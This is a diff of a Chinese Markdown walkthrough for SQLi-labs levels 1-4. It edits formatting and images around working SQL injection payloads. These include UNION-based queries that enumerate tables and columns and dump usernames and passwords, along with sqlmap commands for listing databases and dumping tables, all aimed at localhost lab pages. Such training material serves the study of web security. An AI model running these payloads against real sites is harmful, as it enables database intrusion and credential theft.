@@ -29,10 +29,10 @@ http://localhost/sqlilabs/practice/example1.php?id=1'
 ```
 http://localhost/sqlilabs/practice/example1.php?id=1' %23
 ```
-    * 注释方式
-        - \# 号注释
-        - %23 注释 
-        - --+ 注释
+* 注释方式
+    - \# 号注释
+    - %23 注释 
+    - --+ 注释
 3. 判断字段数(使用order by)
 
 ```
@@ -66,26 +66,27 @@ http://localhost/sqlilabs/practice/example1.php?id=-1' union select 1,2,3%23
 * 查看表名称
 
     **group_concat函数:将查询到的多行结果连接成字符串**
-    ```
-    http://localhost/sqlilabs/practice/example1.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
-    ```
+```
+http://localhost/sqlilabs/practice/example1.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+```
 
 * 查看列名
 
-    ```
-    http://localhost/sqlilabs/practice/example1.php?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema ='sqlilabs' AND table_name='users' --+
-    ```
+```
+http://localhost/sqlilabs/practice/example1.php?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema ='sqlilabs' AND table_name='users' --+
+```
+
 * 查看字段
 
-    ```
-    http://localhost/sqlilabs/practice/example1.php?id=-1' UNION SELECT 1,group_concat(username SEPARATOR '-'),group_concat(password SEPARATOR '-') FROM users --+
-    ```
+```
+http://localhost/sqlilabs/practice/example1.php?id=-1' UNION SELECT 1,group_concat(username SEPARATOR '-'),group_concat(password SEPARATOR '-') FROM users --+
+```
 
-    将整个表内容显示出来了
+**将整个表内容显示出来了**
 
-    ![2020-1-3-12-29-35](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-12-29-35)
+![2020-1-3-12-29-35](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-12-29-35)
 
-    ### sqlmap 注入常用命令
+### sqlmap 注入常用命令
     ```
     sqlmap -u “注入地址” -v 1 –-dbs # 列举数据库
     sqlmap -u “注入地址” -v 1 –-current-db # 当前数据库
@@ -94,17 +95,18 @@ http://localhost/sqlilabs/practice/example1.php?id=-1' union select 1,2,3%23
     sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns # 获取表的列名
     sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump # 获取表中的数据
     ```
-    * **注意的点**
-        1. **-–batch** 默认选项运行
-        2. **--dbs** 爆破数据库
-        3. **-–technique** 指定sqlmap使用的检测技术
-            - B:Boolean-based-blind （布尔型注入）
-            - U:Union query-based （联合注入）
-            - E:Error-based （报错型注入)
-            - S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）
-            - T:Time-based blind （基于时间延迟注入）
+    
+* **注意的点**
+    1. **-–batch** 默认选项运行
+    2. **--dbs** 爆破数据库
+    3. **-–technique** 指定sqlmap使用的检测技术
+        - B:Boolean-based-blind （布尔型注入）
+        - U:Union query-based （联合注入）
+        - E:Error-based （报错型注入)
+        - S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）
+        - T:Time-based blind （基于时间延迟注入）
 
-            > sqlmap -u "http://localhost/Less-1/?id=1" --dbs --batch --technique B
+        > sqlmap -u "http://localhost/Less-1/?id=1" --dbs --batch --technique B
     
 ## 第二关 基于错误的GET整型注入
 ![2020-1-3-12-46-33](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-12-46-33)
@@ -156,19 +158,19 @@ http://localhost/sqlilabs2/Less-2/index.php?id=-1 union select 1,group_concat(us
 ![2020-1-3-12-59-54](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-12-59-54)
 
 ## 第三关 基于错误的GET单引号变形注入
-![2020-1-3-13-7-22-Sqlilabs通关笔记(1-10)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-13-7-22-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(1-10))
+
+![2020-1-5-9-2-59](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-5-9-2-59)
 
 ### 存在注入点判断
 
 **加上单引号报错,发现存在)**
 
-![2020-1-3-13-24-54-Sqlilabs通关笔记(1-10)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-13-24-54-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(1-10))
-
+![2020-1-5-9-1-57](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-5-9-1-57)
     
-    ```
-    http://localhost/sqlilabs2/Less-3/index.php?id=1') and 1=2 --+ # 报错
-    http://localhost/sqlilabs2/Less-3/index.php?id=1') and 1=1 --+ # 正常
-    ```
+```
+http://localhost/sqlilabs2/Less-3/index.php?id=1') and 1=2 --+ # 报错
+http://localhost/sqlilabs2/Less-3/index.php?id=1') and 1=1 --+ # 正常
+```
 **直接上payload,将数据库脱出**
 ```
     http://localhost/sqlilabs2/Less-3/index.php?id=-1') union select 1,group_concat(username),group_concat(password) from users --+
@@ -179,11 +181,12 @@ http://localhost/sqlilabs2/Less-2/index.php?id=-1 union select 1,group_concat(us
 ### 存在注入点判断
 **加上双引号报错,发现存在"**
 
-![2020-1-3-13-46-16-Sqlilabs通关笔记(1-10)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-13-46-16-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(1-10))
-    ```
-    http://localhost/sqlilabs2/Less-4/index.php?id=1") and 1=2 --+ # 报错
-    http://localhost/sqlilabs2/Less-4/index.php?id=1") and 1=1 --+ # 正常
-    ```
+![2020-1-5-8-58-20](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-5-8-58-20)
+
+```
+http://localhost/sqlilabs2/Less-4/index.php?id=1") and 1=2 --+ # 报错
+http://localhost/sqlilabs2/Less-4/index.php?id=1") and 1=1 --+ # 正常
+```
 **直接上payload,将数据库脱出**
 ```
  http://localhost/sqlilabs2/Less-4/index.php?id=-1") union select 1,group_concat(username),group_concat(password) from users--+
